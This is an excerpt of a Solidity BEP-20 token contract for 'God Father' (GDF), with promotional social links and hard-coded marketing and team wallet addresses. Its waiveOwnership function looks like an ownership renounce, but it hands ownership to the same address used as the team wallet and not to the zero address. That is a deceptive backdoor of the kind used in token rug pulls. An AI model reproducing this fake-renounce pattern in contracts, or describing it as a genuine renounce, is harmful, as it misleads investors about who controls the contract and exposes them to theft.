...
//https://t.me/godfather_bsc
//https://twitter.com/godfather_bsc
abstract contract Context {
//https://godfatherbsc.wixsite.com/godfarther_bsc
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xaae11C165Bf30e688199Ff36A5bF1918745CEe01);
    }
...
contract Godfather is Context, IERC20, Ownable {
    ...
    string private _name = "God Father";
    string private _symbol = "GDF";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x4462382174366369EF4D1Aca42a3EfC0713831DC);
    address payable private teamWalletAddress = payable(0xaae11C165Bf30e688199Ff36A5bF1918745CEe01);
